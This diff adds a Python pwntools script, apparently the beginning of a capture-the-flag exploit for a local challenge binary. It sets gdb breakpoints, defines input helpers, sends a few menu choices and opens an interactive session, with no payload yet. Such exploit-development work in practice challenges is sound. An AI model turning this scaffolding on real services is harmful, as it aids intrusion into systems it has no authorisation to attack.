@@ -1,0 +1,47 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+import signal
+def handle(signum, frame):
+    import os
+    print("killall gdb...")
+    os.system("killall gdb")
+    exit()
+signal.signal(signal.SIGINT, handle)
+exe = ELF("./challe")
+# context.log_level='debug'
+context.terminal = ["foot"]
+# p = remote("addr", 1337)
+p = process([exe.path])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+    b*0x00000000004013C3
+    b*0x00000000004013C3
+    b*0x00000000004014dd
+               """)
+    # p = gdb.debug([exe.path],"""
+    # b*0x00000000004013C3
+    # b*0x00000000004013C3
+    # b*0x00000000004014dd
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+
+
+gdbs()
+sla("ou want to use?","11")
+sla("?","0")
+sla("?","132")
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
